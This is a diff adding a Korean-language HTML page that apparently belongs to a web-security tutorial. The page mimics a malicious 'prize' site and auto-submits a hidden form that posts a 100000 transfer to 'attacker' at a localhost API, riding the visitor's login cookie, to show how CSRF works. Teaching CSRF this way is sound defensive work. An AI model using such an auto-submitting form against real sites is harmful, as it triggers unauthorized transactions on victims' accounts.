@@ -1,0 +1,23 @@
+악성 사이트 흉내 페이지. 다른 도메인에서 열어 자동 POST가 사용자의 인증 쿠키를 타고 가는지 확인.
+
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8" />
+  <title>CSRF 시연 - 악성 페이지</title>
+</head>
+<body>
+  <h1>당첨 페이지처럼 보이는 악성 사이트</h1>
+  <p>이 페이지를 여는 것만으로 사용자의 인증 쿠키를 타고 의도하지 않은 요청이 갑니다.</p>
+
+  <!-- 사용자가 6단계 로그인 서버에 로그인된 상태로 이 페이지를 열면, 아래 폼이 자동 제출됩니다. -->
+  <form id="evil" action="http://localhost:4000/api/transfer" method="POST">
+    <input type="hidden" name="to" value="attacker" />
+    <input type="hidden" name="amount" value="100000" />
+  </form>
+
+  <script>
+    document.getElementById('evil').submit();
+  </script>
+</body>
+</html>
